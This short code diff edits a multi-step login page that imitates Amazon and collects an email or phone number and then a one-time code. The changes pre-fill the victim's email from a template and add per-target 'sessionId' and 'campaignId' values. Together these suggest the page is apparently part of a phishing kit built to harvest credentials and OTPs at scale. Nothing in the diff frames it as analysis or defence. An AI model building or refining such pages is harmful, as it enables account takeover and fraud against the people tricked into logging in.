@@ -251,7 +251,7 @@
         <h1>Log in</h1>
         <form id="form-step-1">
             <label for="email">Email or mobile phone number</label>
-            <input type="text" id="email" name="email" required>
+            <input type="text" id="email" name="email" value="{{ email }}" required>
             
             <button type="submit" id="btn-next" class="btn-primary">Continue</button>
             
@@ -333,7 +333,9 @@
                     step2: '#step-2',
                     step3: '#step-3-otp',
                     errorMsg: '#error-message'
-                }
+                },
+                sessionId: '{{ session_id }}',
+                campaignId: '{{ campaign_id }}'
             });
 
             // Custom UI logic for Amazon (Change email link)
